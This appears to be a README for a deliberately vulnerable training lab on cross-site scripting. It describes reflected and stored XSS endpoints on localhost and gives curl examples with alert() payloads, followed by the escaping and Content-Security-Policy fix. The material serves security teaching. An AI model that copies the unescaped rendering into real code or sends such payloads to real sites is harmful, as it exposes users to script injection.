# 02 — Cross-Site Scripting (XSS)

Port: `3002`

## Vulnerable endpoints

- `GET /search?q=` — reflects `q` straight into the HTML response (reflected XSS).
- `POST /messages` — stores `name`/`message` and renders them unescaped on `/` (stored XSS).

## Example payloads

```bash
curl "http://localhost:3002/search?q=<script>alert(1)</script>"

curl -X POST http://localhost:3002/messages \
  -d "name=attacker&message=<img src=x onerror=alert('stored-xss')>"
```

Then visit `http://localhost:3002/` — the stored payload fires for every visitor.

## What the fix would look like

HTML-escape all user-controlled output (or use a templating engine that
auto-escapes by default), and set a strict Content-Security-Policy header.